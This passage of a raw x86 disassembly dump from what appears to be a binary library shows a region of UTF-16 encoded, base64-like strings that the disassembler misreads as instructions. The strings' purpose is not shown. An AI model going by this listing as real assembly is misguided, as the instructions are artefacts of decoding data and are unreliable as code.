1000463c:	00 61 00             	add    %ah,0x0(%ecx)
1000463f:	46                   	inc    %esi
10004640:	00 4a 00             	add    %cl,0x0(%edx)
10004643:	55                   	push   %ebp
10004644:	00 5a 00             	add    %bl,0x0(%edx)
10004647:	6a 00                	push   $0x0
10004649:	52                   	push   %edx
1000464a:	00 48 00             	add    %cl,0x0(%eax)
1000464d:	61                   	popa
1000464e:	00 47 00             	add    %al,0x0(%edi)
10004651:	4e                   	dec    %esi
10004652:	00 36                	add    %dh,(%esi)
10004654:	00 62 00             	add    %ah,0x0(%edx)
10004657:	47                   	inc    %edi
10004658:	00 4a 00             	add    %cl,0x0(%edx)
1000465b:	75 00                	jne    0x1000465d
1000465d:	53                   	push   %ebx
1000465e:	00 32                	add    %dh,(%edx)
10004660:	00 68 00             	add    %ch,0x0(%eax)
10004663:	53                   	push   %ebx
10004664:	00 56 00             	add    %dl,0x0(%esi)
10004667:	47                   	inc    %edi
10004668:	00 59 00             	add    %bl,0x0(%ecx)
1000466b:	30 00                	xor    %al,(%eax)
1000466d:	52                   	push   %edx
1000466e:	00 32                	add    %dh,(%edx)
10004670:	00 68 00             	add    %ch,0x0(%eax)
10004673:	6a 00                	push   $0x0
10004675:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004679:	74 00                	je     0x1000467b
1000467b:	6f                   	outsl  %ds:(%esi),(%dx)
1000467c:	00 55 00             	add    %dl,0x0(%ebp)
1000467f:	6c                   	insb   (%dx),%es:(%edi)
10004680:	00 52 00             	add    %dl,0x0(%edx)
10004683:	6d                   	insl   (%dx),%es:(%edi)
10004684:	00 4e 00             	add    %cl,0x0(%esi)
10004687:	45                   	inc    %ebp
10004688:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
1000468c:	00 59 00             	add    %bl,0x0(%ecx)
1000468f:	33 00                	xor    (%eax),%eax
10004691:	70 00                	jo     0x10004693
10004693:	53                   	push   %ebx
10004694:	00 61 00             	add    %ah,0x0(%ecx)
10004697:	47                   	inc    %edi
10004698:	00 4e 00             	add    %cl,0x0(%esi)
1000469b:	4c                   	dec    %esp
1000469c:	00 61 00             	add    %ah,0x0(%ecx)
1000469f:	46                   	inc    %esi
100046a0:	00 4a 00             	add    %cl,0x0(%edx)
100046a3:	55                   	push   %ebp
100046a4:	00 5a 00             	add    %bl,0x0(%edx)
100046a7:	6a 00                	push   $0x0
100046a9:	52                   	push   %edx
100046aa:	00 48 00             	add    %cl,0x0(%eax)
100046ad:	61                   	popa
100046ae:	00 47 00             	add    %al,0x0(%edi)
100046b1:	4e                   	dec    %esi
100046b2:	00 36                	add    %dh,(%esi)
100046b4:	00 53 00             	add    %dl,0x0(%ebx)
100046b7:	32 00                	xor    (%eax),%al
100046b9:	68 00 53 00 56       	push   $0x56005300
100046be:	00 47 00             	add    %al,0x0(%edi)
100046c1:	59                   	pop    %ecx
100046c2:	00 30                	add    %dh,(%eax)
100046c4:	00 52 00             	add    %dl,0x0(%edx)
100046c7:	32 00                	xor    (%eax),%al
100046c9:	68 00 6a 00 65       	push   $0x65006a00
100046ce:	00 6a 00             	add    %ch,0x0(%edx)
100046d1:	4a                   	dec    %edx
100046d2:	00 7a 00             	add    %bh,0x0(%edx)
100046d5:	50                   	push   %eax
100046d6:	00 55 00             	add    %dl,0x0(%ebp)
100046d9:	74 00                	je     0x100046db
100046db:	6f                   	outsl  %ds:(%esi),(%dx)
100046dc:	00 55 00             	add    %dl,0x0(%ebp)
100046df:	6c                   	insb   (%dx),%es:(%edi)
100046e0:	00 52 00             	add    %dl,0x0(%edx)
100046e3:	6d                   	insl   (%dx),%es:(%edi)
100046e4:	00 4e 00             	add    %cl,0x0(%esi)
100046e7:	45                   	inc    %ebp
100046e8:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100046ec:	00 59 00             	add    %bl,0x0(%ecx)
100046ef:	33 00                	xor    (%eax),%eax
100046f1:	6f                   	outsl  %ds:(%esi),(%dx)
100046f2:	00 3d 00 00 15 4b    	add    %bh,0x4b150000
100046f8:	00 68 00             	add    %ch,0x0(%eax)
100046fb:	52                   	push   %edx
100046fc:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
10004700:	00 34 00             	add    %dh,(%eax,%eax,1)
10004703:	47                   	inc    %edi
10004704:	00 68 00             	add    %ch,0x0(%eax)
10004707:	63 00                	arpl   %eax,(%eax)
10004709:	7a 00                	jp     0x1000470b
1000470b:	00 85 81 53 00 6c    	add    %al,0x6c005381(%ebp)
10004711:	00 56 00             	add    %dl,0x0(%esi)
10004714:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004718:	45                   	inc    %ebp
10004719:	00 5a 00             	add    %bl,0x0(%edx)
1000471c:	46                   	inc    %esi
1000471d:	00 4f 00             	add    %cl,0x0(%edi)
10004720:	46                   	inc    %esi
10004721:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004725:	00 55 00             	add    %dl,0x0(%ebp)
10004728:	31 00                	xor    %eax,(%eax)
1000472a:	46                   	inc    %esi
1000472b:	00 36                	add    %dh,(%esi)
1000472d:	00 63 00             	add    %ah,0x0(%ebx)
10004730:	45                   	inc    %ebp
10004731:	00 70 00             	add    %dh,0x0(%eax)
10004734:	56                   	push   %esi
10004735:	00 65 00             	add    %ah,0x0(%ebp)
10004738:	6e                   	outsb  %ds:(%esi),(%dx)
10004739:	00 68 00             	add    %ch,0x0(%eax)
1000473c:	47                   	inc    %edi
1000473d:	00 52 00             	add    %dl,0x0(%edx)
10004740:	54                   	push   %esp
10004741:	00 68 00             	add    %ch,0x0(%eax)
10004744:	58                   	pop    %eax
10004745:	00 55 00             	add    %dl,0x0(%ebp)
10004748:	31 00                	xor    %eax,(%eax)
1000474a:	4e                   	dec    %esi
1000474b:	00 4b 00             	add    %cl,0x0(%ebx)
1000474e:	56                   	push   %esi
1000474f:	00 58 00             	add    %bl,0x0(%eax)
10004752:	70 00                	jo     0x10004754
10004754:	34 00                	xor    $0x0,%al
10004756:	52                   	push   %edx
10004757:	00 6b 00             	add    %ch,0x0(%ebx)
1000475a:	55                   	push   %ebp
1000475b:	00 34 00             	add    %dh,(%eax,%eax,1)
1000475e:	56                   	push   %esi
1000475f:	00 31                	add    %dh,(%ecx)
10004761:	00 4e 00             	add    %cl,0x0(%esi)
10004764:	54                   	push   %esp
10004765:	00 59 00             	add    %bl,0x0(%ecx)
10004768:	31 00                	xor    %eax,(%eax)
1000476a:	68 00 47 00 53       	push   $0x53004700
1000476f:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10004773:	00 36                	add    %dh,(%esi)
10004775:	00 65 00             	add    %ah,0x0(%ebp)
10004778:	45                   	inc    %ebp
10004779:	00 5a 00             	add    %bl,0x0(%edx)
1000477c:	46                   	inc    %esi
1000477d:	00 4f 00             	add    %cl,0x0(%edi)
10004780:	46                   	inc    %esi
10004781:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004785:	00 55 00             	add    %dl,0x0(%ebp)
10004788:	30 00                	xor    %al,(%eax)
1000478a:	70 00                	jo     0x1000478c
1000478c:	56                   	push   %esi
1000478d:	00 65 00             	add    %ah,0x0(%ebp)
10004790:	6e                   	outsb  %ds:(%esi),(%dx)
10004791:	00 68 00             	add    %ch,0x0(%eax)
10004794:	47                   	inc    %edi
10004795:	00 52 00             	add    %dl,0x0(%edx)
10004798:	54                   	push   %esp
10004799:	00 68 00             	add    %ch,0x0(%eax)
1000479c:	58                   	pop    %eax
1000479d:	00 55 00             	add    %dl,0x0(%ebp)
100047a0:	31 00                	xor    %eax,(%eax)
100047a2:	4e                   	dec    %esi
100047a3:	00 6b 00             	add    %ch,0x0(%ebx)
100047a6:	63 00                	arpl   %eax,(%eax)
100047a8:	47                   	inc    %edi
100047a9:	00 4a 00             	add    %cl,0x0(%edx)
100047ac:	4b                   	dec    %ebx
100047ad:	00 56 00             	add    %dl,0x0(%esi)
100047b0:	58                   	pop    %eax
100047b1:	00 70 00             	add    %dh,0x0(%eax)
100047b4:	34 00                	xor    $0x0,%al
100047b6:	52                   	push   %edx
100047b7:	00 6b 00             	add    %ch,0x0(%ebx)
100047ba:	55                   	push   %ebp
100047bb:	00 34 00             	add    %dh,(%eax,%eax,1)
100047be:	56                   	push   %esi
100047bf:	00 31                	add    %dh,(%ecx)
100047c1:	00 4e 00             	add    %cl,0x0(%esi)
100047c4:	54                   	push   %esp
100047c5:	00 53 00             	add    %dl,0x0(%ebx)
100047c8:	6c                   	insb   (%dx),%es:(%edi)
100047c9:	00 56 00             	add    %dl,0x0(%esi)
100047cc:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
100047d0:	45                   	inc    %ebp
100047d1:	00 5a 00             	add    %bl,0x0(%edx)
100047d4:	46                   	inc    %esi
100047d5:	00 4f 00             	add    %cl,0x0(%edi)
100047d8:	46                   	inc    %esi
100047d9:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
100047dd:	00 55 00             	add    %dl,0x0(%ebp)
100047e0:	32 00                	xor    (%eax),%al
100047e2:	31 00                	xor    %eax,(%eax)
100047e4:	53                   	push   %ebx
100047e5:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100047e9:	00 70 00             	add    %dh,0x0(%eax)
100047ec:	56                   	push   %esi
100047ed:	00 65 00             	add    %ah,0x0(%ebp)
100047f0:	6e                   	outsb  %ds:(%esi),(%dx)
100047f1:	00 68 00             	add    %ch,0x0(%eax)
100047f4:	47                   	inc    %edi
100047f5:	00 52 00             	add    %dl,0x0(%edx)
100047f8:	54                   	push   %esp
100047f9:	00 68 00             	add    %ch,0x0(%eax)
100047fc:	58                   	pop    %eax
100047fd:	00 55 00             	add    %dl,0x0(%ebp)
10004800:	31 00                	xor    %eax,(%eax)
10004802:	4e                   	dec    %esi
10004803:	00 4b 00             	add    %cl,0x0(%ebx)
10004806:	56                   	push   %esi
10004807:	00 58 00             	add    %bl,0x0(%eax)
1000480a:	70 00                	jo     0x1000480c
1000480c:	34 00                	xor    $0x0,%al
1000480e:	52                   	push   %edx
1000480f:	00 6b 00             	add    %ch,0x0(%ebx)
10004812:	55                   	push   %ebp
10004813:	00 34 00             	add    %dh,(%eax,%eax,1)
10004816:	56                   	push   %esi
10004817:	00 31                	add    %dh,(%ecx)
10004819:	00 4e 00             	add    %cl,0x0(%esi)
1000481c:	54                   	push   %esp
1000481d:	00 5a 00             	add    %bl,0x0(%edx)
10004820:	44                   	inc    %esp
10004821:	00 4e 00             	add    %cl,0x0(%esi)
10004824:	4f                   	dec    %edi
10004825:	00 53 00             	add    %dl,0x0(%ebx)
10004828:	6c                   	insb   (%dx),%es:(%edi)
10004829:	00 56 00             	add    %dl,0x0(%esi)
1000482c:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004830:	45                   	inc    %ebp
10004831:	00 5a 00             	add    %bl,0x0(%edx)
10004834:	46                   	inc    %esi
10004835:	00 4f 00             	add    %cl,0x0(%edi)
10004838:	46                   	inc    %esi
10004839:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
1000483d:	00 55 00             	add    %dl,0x0(%ebp)
10004840:	30 00                	xor    %al,(%eax)
10004842:	70 00                	jo     0x10004844
10004844:	56                   	push   %esi
10004845:	00 65 00             	add    %ah,0x0(%ebp)
10004848:	6e                   	outsb  %ds:(%esi),(%dx)
10004849:	00 68 00             	add    %ch,0x0(%eax)
1000484c:	47                   	inc    %edi
1000484d:	00 52 00             	add    %dl,0x0(%edx)
10004850:	54                   	push   %esp
10004851:	00 68 00             	add    %ch,0x0(%eax)
10004854:	58                   	pop    %eax
10004855:	00 55 00             	add    %dl,0x0(%ebp)
10004858:	31 00                	xor    %eax,(%eax)
1000485a:	4e                   	dec    %esi
1000485b:	00 6a 00             	add    %ch,0x0(%edx)
1000485e:	57                   	push   %edi
1000485f:	00 45 00             	add    %al,0x0(%ebp)
10004862:	56                   	push   %esi
10004863:	00 4b 00             	add    %cl,0x0(%ebx)
10004866:	56                   	push   %esi
10004867:	00 58 00             	add    %bl,0x0(%eax)
1000486a:	70 00                	jo     0x1000486c
1000486c:	34 00                	xor    $0x0,%al
1000486e:	52                   	push   %edx
1000486f:	00 6b 00             	add    %ch,0x0(%ebx)
10004872:	55                   	push   %ebp
10004873:	00 34 00             	add    %dh,(%eax,%eax,1)
10004876:	56                   	push   %esi
10004877:	00 31                	add    %dh,(%ecx)
10004879:	00 4e 00             	add    %cl,0x0(%esi)
1000487c:	54                   	push   %esp
1000487d:	00 53 00             	add    %dl,0x0(%ebx)
10004880:	6c                   	insb   (%dx),%es:(%edi)
10004881:	00 56 00             	add    %dl,0x0(%esi)
10004884:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004888:	45                   	inc    %ebp
10004889:	00 5a 00             	add    %bl,0x0(%edx)
1000488c:	46                   	inc    %esi
1000488d:	00 4f 00             	add    %cl,0x0(%edi)
10004890:	46                   	inc    %esi
10004891:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004895:	00 55 00             	add    %dl,0x0(%ebp)
10004898:	7a 00                	jp     0x1000489a
1000489a:	46                   	inc    %esi
1000489b:	00 77 00             	add    %dh,0x0(%edi)
1000489e:	57                   	push   %edi
1000489f:	00 55 00             	add    %dl,0x0(%ebp)
100048a2:	70 00                	jo     0x100048a4
100048a4:	56                   	push   %esi
100048a5:	00 65 00             	add    %ah,0x0(%ebp)
100048a8:	6e                   	outsb  %ds:(%esi),(%dx)
100048a9:	00 68 00             	add    %ch,0x0(%eax)
100048ac:	47                   	inc    %edi
100048ad:	00 52 00             	add    %dl,0x0(%edx)
100048b0:	54                   	push   %esp
100048b1:	00 68 00             	add    %ch,0x0(%eax)
100048b4:	58                   	pop    %eax
100048b5:	00 55 00             	add    %dl,0x0(%ebp)
100048b8:	31 00                	xor    %eax,(%eax)
100048ba:	4e                   	dec    %esi
100048bb:	00 4b 00             	add    %cl,0x0(%ebx)
100048be:	56                   	push   %esi
100048bf:	00 58 00             	add    %bl,0x0(%eax)
100048c2:	70 00                	jo     0x100048c4
100048c4:	34 00                	xor    $0x0,%al
100048c6:	52                   	push   %edx
100048c7:	00 6b 00             	add    %ch,0x0(%ebx)
100048ca:	55                   	push   %ebp
100048cb:	00 34 00             	add    %dh,(%eax,%eax,1)
100048ce:	56                   	push   %esi
100048cf:	00 31                	add    %dh,(%ecx)
100048d1:	00 4e 00             	add    %cl,0x0(%esi)
100048d4:	54                   	push   %esp
100048d5:	00 4d 00             	add    %cl,0x0(%ebp)
100048d8:	30 00                	xor    %al,(%eax)
100048da:	70 00                	jo     0x100048dc
100048dc:	32 00                	xor    (%eax),%al
100048de:	53                   	push   %ebx
100048df:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
100048e3:	00 36                	add    %dh,(%esi)
100048e5:	00 65 00             	add    %ah,0x0(%ebp)
100048e8:	45                   	inc    %ebp
100048e9:	00 5a 00             	add    %bl,0x0(%edx)
100048ec:	46                   	inc    %esi
100048ed:	00 4f 00             	add    %cl,0x0(%edi)
100048f0:	46                   	inc    %esi
100048f1:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
100048f5:	00 55 00             	add    %dl,0x0(%ebp)
100048f8:	30 00                	xor    %al,(%eax)
100048fa:	70 00                	jo     0x100048fc
100048fc:	56                   	push   %esi
100048fd:	00 65 00             	add    %ah,0x0(%ebp)
10004900:	6e                   	outsb  %ds:(%esi),(%dx)
10004901:	00 68 00             	add    %ch,0x0(%eax)
10004904:	47                   	inc    %edi
10004905:	00 52 00             	add    %dl,0x0(%edx)
10004908:	54                   	push   %esp
10004909:	00 68 00             	add    %ch,0x0(%eax)
1000490c:	58                   	pop    %eax
1000490d:	00 55 00             	add    %dl,0x0(%ebp)
10004910:	31 00                	xor    %eax,(%eax)
10004912:	4e                   	dec    %esi
10004913:	00 6a 00             	add    %ch,0x0(%edx)
10004916:	4d                   	dec    %ebp
10004917:	00 6a 00             	add    %ch,0x0(%edx)
1000491a:	6c                   	insb   (%dx),%es:(%edi)
1000491b:	00 4b 00             	add    %cl,0x0(%ebx)
1000491e:	56                   	push   %esi
1000491f:	00 58 00             	add    %bl,0x0(%eax)
10004922:	70 00                	jo     0x10004924
10004924:	34 00                	xor    $0x0,%al
10004926:	52                   	push   %edx
10004927:	00 6b 00             	add    %ch,0x0(%ebx)
1000492a:	55                   	push   %ebp
1000492b:	00 34 00             	add    %dh,(%eax,%eax,1)
1000492e:	56                   	push   %esi
1000492f:	00 31                	add    %dh,(%ecx)
10004931:	00 4e 00             	add    %cl,0x0(%esi)
10004934:	54                   	push   %esp
10004935:	00 53 00             	add    %dl,0x0(%ebx)
10004938:	6c                   	insb   (%dx),%es:(%edi)
10004939:	00 56 00             	add    %dl,0x0(%esi)
1000493c:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004940:	45                   	inc    %ebp
10004941:	00 5a 00             	add    %bl,0x0(%edx)
10004944:	46                   	inc    %esi
10004945:	00 4f 00             	add    %cl,0x0(%edi)
10004948:	46                   	inc    %esi
10004949:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
1000494d:	00 55 00             	add    %dl,0x0(%ebp)
10004950:	32 00                	xor    (%eax),%al
10004952:	31 00                	xor    %eax,(%eax)
10004954:	6b 00 51             	imul   $0x51,(%eax),%eax
10004957:	00 30                	add    %dh,(%eax)
10004959:	00 70 00             	add    %dh,0x0(%eax)
1000495c:	56                   	push   %esi
1000495d:	00 65 00             	add    %ah,0x0(%ebp)
10004960:	6e                   	outsb  %ds:(%esi),(%dx)
10004961:	00 68 00             	add    %ch,0x0(%eax)
10004964:	47                   	inc    %edi
10004965:	00 52 00             	add    %dl,0x0(%edx)
10004968:	54                   	push   %esp
10004969:	00 68 00             	add    %ch,0x0(%eax)
1000496c:	58                   	pop    %eax
1000496d:	00 55 00             	add    %dl,0x0(%ebp)
10004970:	31 00                	xor    %eax,(%eax)
10004972:	4e                   	dec    %esi
10004973:	00 4b 00             	add    %cl,0x0(%ebx)
10004976:	56                   	push   %esi
10004977:	00 58 00             	add    %bl,0x0(%eax)
1000497a:	70 00                	jo     0x1000497c
1000497c:	34 00                	xor    $0x0,%al
1000497e:	52                   	push   %edx
1000497f:	00 6b 00             	add    %ch,0x0(%ebx)
10004982:	55                   	push   %ebp
10004983:	00 34 00             	add    %dh,(%eax,%eax,1)
10004986:	56                   	push   %esi
10004987:	00 31                	add    %dh,(%ecx)
10004989:	00 4e 00             	add    %cl,0x0(%esi)
1000498c:	54                   	push   %esp
1000498d:	00 4e 00             	add    %cl,0x0(%esi)
10004990:	55                   	push   %ebp
10004991:	00 39                	add    %bh,(%ecx)
10004993:	00 53 00             	add    %dl,0x0(%ebx)
10004996:	53                   	push   %ebx
10004997:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
1000499b:	00 36                	add    %dh,(%esi)
1000499d:	00 65 00             	add    %ah,0x0(%ebp)
100049a0:	45                   	inc    %ebp
100049a1:	00 5a 00             	add    %bl,0x0(%edx)
100049a4:	46                   	inc    %esi
100049a5:	00 4f 00             	add    %cl,0x0(%edi)
100049a8:	46                   	inc    %esi
100049a9:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
100049ad:	00 55 00             	add    %dl,0x0(%ebp)
100049b0:	30 00                	xor    %al,(%eax)
100049b2:	70 00                	jo     0x100049b4
100049b4:	56                   	push   %esi
100049b5:	00 65 00             	add    %ah,0x0(%ebp)
100049b8:	6e                   	outsb  %ds:(%esi),(%dx)
100049b9:	00 68 00             	add    %ch,0x0(%eax)
100049bc:	47                   	inc    %edi
100049bd:	00 52 00             	add    %dl,0x0(%edx)
100049c0:	54                   	push   %esp
100049c1:	00 68 00             	add    %ch,0x0(%eax)
100049c4:	58                   	pop    %eax
100049c5:	00 55 00             	add    %dl,0x0(%ebp)
100049c8:	31 00                	xor    %eax,(%eax)
100049ca:	4e                   	dec    %esi
100049cb:	00 57 00             	add    %dl,0x0(%edi)
100049ce:	55                   	push   %ebp
100049cf:	00 6d 00             	add    %ch,0x0(%ebp)
100049d2:	4e                   	dec    %esi
100049d3:	00 4b 00             	add    %cl,0x0(%ebx)
100049d6:	56                   	push   %esi
100049d7:	00 58 00             	add    %bl,0x0(%eax)
100049da:	70 00                	jo     0x100049dc
100049dc:	34 00                	xor    $0x0,%al
100049de:	52                   	push   %edx
100049df:	00 6b 00             	add    %ch,0x0(%ebx)
100049e2:	55                   	push   %ebp
100049e3:	00 34 00             	add    %dh,(%eax,%eax,1)
100049e6:	56                   	push   %esi
100049e7:	00 31                	add    %dh,(%ecx)
100049e9:	00 4e 00             	add    %cl,0x0(%esi)
100049ec:	54                   	push   %esp
100049ed:	00 53 00             	add    %dl,0x0(%ebx)
100049f0:	6c                   	insb   (%dx),%es:(%edi)
100049f1:	00 56 00             	add    %dl,0x0(%esi)
100049f4:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
100049f8:	45                   	inc    %ebp
100049f9:	00 5a 00             	add    %bl,0x0(%edx)
100049fc:	46                   	inc    %esi
100049fd:	00 4f 00             	add    %cl,0x0(%edi)
10004a00:	46                   	inc    %esi
10004a01:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004a05:	00 55 00             	add    %dl,0x0(%ebp)
10004a08:	31 00                	xor    %eax,(%eax)
10004a0a:	68 00 46 00 57       	push   $0x57004600
10004a0f:	00 6b 00             	add    %ch,0x0(%ebx)
10004a12:	70 00                	jo     0x10004a14
10004a14:	56                   	push   %esi
10004a15:	00 65 00             	add    %ah,0x0(%ebp)
10004a18:	6e                   	outsb  %ds:(%esi),(%dx)
10004a19:	00 68 00             	add    %ch,0x0(%eax)
10004a1c:	47                   	inc    %edi
10004a1d:	00 52 00             	add    %dl,0x0(%edx)
10004a20:	54                   	push   %esp
10004a21:	00 68 00             	add    %ch,0x0(%eax)
10004a24:	58                   	pop    %eax
10004a25:	00 55 00             	add    %dl,0x0(%ebp)
10004a28:	31 00                	xor    %eax,(%eax)
10004a2a:	4e                   	dec    %esi
10004a2b:	00 4b 00             	add    %cl,0x0(%ebx)
10004a2e:	56                   	push   %esi
10004a2f:	00 58 00             	add    %bl,0x0(%eax)
10004a32:	70 00                	jo     0x10004a34
10004a34:	34 00                	xor    $0x0,%al
10004a36:	52                   	push   %edx
10004a37:	00 6b 00             	add    %ch,0x0(%ebx)
10004a3a:	55                   	push   %ebp
10004a3b:	00 34 00             	add    %dh,(%eax,%eax,1)
10004a3e:	56                   	push   %esi
10004a3f:	00 31                	add    %dh,(%ecx)
10004a41:	00 4e 00             	add    %cl,0x0(%esi)
10004a44:	54                   	push   %esp
10004a45:	00 65 00             	add    %ah,0x0(%ebp)
10004a48:	56                   	push   %esi
10004a49:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
10004a4d:	00 53 00             	add    %dl,0x0(%ebx)
10004a50:	6c                   	insb   (%dx),%es:(%edi)
10004a51:	00 56 00             	add    %dl,0x0(%esi)
10004a54:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004a58:	45                   	inc    %ebp
10004a59:	00 5a 00             	add    %bl,0x0(%edx)
10004a5c:	46                   	inc    %esi
10004a5d:	00 4f 00             	add    %cl,0x0(%edi)
10004a60:	46                   	inc    %esi
10004a61:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004a65:	00 55 00             	add    %dl,0x0(%ebp)
10004a68:	30 00                	xor    %al,(%eax)
10004a6a:	70 00                	jo     0x10004a6c
10004a6c:	56                   	push   %esi
10004a6d:	00 65 00             	add    %ah,0x0(%ebp)
10004a70:	6e                   	outsb  %ds:(%esi),(%dx)
10004a71:	00 68 00             	add    %ch,0x0(%eax)
10004a74:	47                   	inc    %edi
10004a75:	00 52 00             	add    %dl,0x0(%edx)
10004a78:	54                   	push   %esp
10004a79:	00 68 00             	add    %ch,0x0(%eax)
10004a7c:	58                   	pop    %eax
10004a7d:	00 55 00             	add    %dl,0x0(%ebp)
10004a80:	31 00                	xor    %eax,(%eax)
10004a82:	4d                   	dec    %ebp
10004a83:	00 78 00             	add    %bh,0x0(%eax)
10004a86:	62 00                	bound  %eax,(%eax)
10004a88:	47                   	inc    %edi
10004a89:	00 52 00             	add    %dl,0x0(%edx)
10004a8c:	4b                   	dec    %ebx
10004a8d:	00 56 00             	add    %dl,0x0(%esi)
10004a90:	58                   	pop    %eax
10004a91:	00 70 00             	add    %dh,0x0(%eax)
10004a94:	34 00                	xor    $0x0,%al
10004a96:	52                   	push   %edx
10004a97:	00 6b 00             	add    %ch,0x0(%ebx)
10004a9a:	55                   	push   %ebp
10004a9b:	00 34 00             	add    %dh,(%eax,%eax,1)
10004a9e:	56                   	push   %esi
10004a9f:	00 31                	add    %dh,(%ecx)
10004aa1:	00 4e 00             	add    %cl,0x0(%esi)
10004aa4:	54                   	push   %esp
10004aa5:	00 53 00             	add    %dl,0x0(%ebx)
10004aa8:	6c                   	insb   (%dx),%es:(%edi)
10004aa9:	00 56 00             	add    %dl,0x0(%esi)
10004aac:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004ab0:	45                   	inc    %ebp
10004ab1:	00 5a 00             	add    %bl,0x0(%edx)
10004ab4:	46                   	inc    %esi
10004ab5:	00 4f 00             	add    %cl,0x0(%edi)
10004ab8:	46                   	inc    %esi
10004ab9:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004abd:	00 55 00             	add    %dl,0x0(%ebp)
10004ac0:	7a 00                	jp     0x10004ac2
10004ac2:	49                   	dec    %ecx
10004ac3:	00 35 00 65 00 55    	add    %dh,0x55006500
10004ac9:	00 70 00             	add    %dh,0x0(%eax)
10004acc:	56                   	push   %esi
10004acd:	00 65 00             	add    %ah,0x0(%ebp)
10004ad0:	6e                   	outsb  %ds:(%esi),(%dx)
10004ad1:	00 68 00             	add    %ch,0x0(%eax)
10004ad4:	47                   	inc    %edi
10004ad5:	00 52 00             	add    %dl,0x0(%edx)
10004ad8:	54                   	push   %esp
10004ad9:	00 68 00             	add    %ch,0x0(%eax)
10004adc:	58                   	pop    %eax
10004add:	00 55 00             	add    %dl,0x0(%ebp)
10004ae0:	31 00                	xor    %eax,(%eax)
10004ae2:	4e                   	dec    %esi
10004ae3:	00 4b 00             	add    %cl,0x0(%ebx)
10004ae6:	56                   	push   %esi
10004ae7:	00 58 00             	add    %bl,0x0(%eax)
10004aea:	70 00                	jo     0x10004aec
10004aec:	34 00                	xor    $0x0,%al
10004aee:	52                   	push   %edx
10004aef:	00 6b 00             	add    %ch,0x0(%ebx)
10004af2:	55                   	push   %ebp
10004af3:	00 34 00             	add    %dh,(%eax,%eax,1)
10004af6:	56                   	push   %esi
10004af7:	00 31                	add    %dh,(%ecx)
10004af9:	00 4e 00             	add    %cl,0x0(%esi)
10004afc:	54                   	push   %esp
10004afd:	00 59 00             	add    %bl,0x0(%ecx)
10004b00:	54                   	push   %esp
10004b01:	00 46 00             	add    %al,0x0(%esi)
10004b04:	34 00                	xor    $0x0,%al
10004b06:	53                   	push   %ebx
10004b07:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10004b0b:	00 36                	add    %dh,(%esi)
10004b0d:	00 65 00             	add    %ah,0x0(%ebp)
10004b10:	45                   	inc    %ebp
10004b11:	00 5a 00             	add    %bl,0x0(%edx)
10004b14:	46                   	inc    %esi
10004b15:	00 4f 00             	add    %cl,0x0(%edi)
10004b18:	46                   	inc    %esi
10004b19:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004b1d:	00 55 00             	add    %dl,0x0(%ebp)
10004b20:	30 00                	xor    %al,(%eax)
10004b22:	70 00                	jo     0x10004b24
10004b24:	56                   	push   %esi
10004b25:	00 65 00             	add    %ah,0x0(%ebp)
10004b28:	6e                   	outsb  %ds:(%esi),(%dx)
10004b29:	00 68 00             	add    %ch,0x0(%eax)
10004b2c:	47                   	inc    %edi
10004b2d:	00 52 00             	add    %dl,0x0(%edx)
10004b30:	54                   	push   %esp
10004b31:	00 68 00             	add    %ch,0x0(%eax)
10004b34:	58                   	pop    %eax
10004b35:	00 55 00             	add    %dl,0x0(%ebp)
10004b38:	31 00                	xor    %eax,(%eax)
10004b3a:	4e                   	dec    %esi
10004b3b:	00 6a 00             	add    %ch,0x0(%edx)
10004b3e:	5a                   	pop    %edx
10004b3f:	00 47 00             	add    %al,0x0(%edi)
10004b42:	70 00                	jo     0x10004b44
10004b44:	4b                   	dec    %ebx
10004b45:	00 56 00             	add    %dl,0x0(%esi)
10004b48:	58                   	pop    %eax
10004b49:	00 70 00             	add    %dh,0x0(%eax)
10004b4c:	34 00                	xor    $0x0,%al
10004b4e:	52                   	push   %edx
10004b4f:	00 6b 00             	add    %ch,0x0(%ebx)
10004b52:	55                   	push   %ebp
10004b53:	00 34 00             	add    %dh,(%eax,%eax,1)
10004b56:	56                   	push   %esi
10004b57:	00 31                	add    %dh,(%ecx)
10004b59:	00 4e 00             	add    %cl,0x0(%esi)
10004b5c:	54                   	push   %esp
10004b5d:	00 53 00             	add    %dl,0x0(%ebx)
10004b60:	6c                   	insb   (%dx),%es:(%edi)
10004b61:	00 56 00             	add    %dl,0x0(%esi)
10004b64:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004b68:	45                   	inc    %ebp
10004b69:	00 5a 00             	add    %bl,0x0(%edx)
10004b6c:	46                   	inc    %esi
10004b6d:	00 4f 00             	add    %cl,0x0(%edi)
10004b70:	46                   	inc    %esi
10004b71:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004b75:	00 55 00             	add    %dl,0x0(%ebp)
10004b78:	31 00                	xor    %eax,(%eax)
10004b7a:	46                   	inc    %esi
10004b7b:	00 31                	add    %dh,(%ecx)
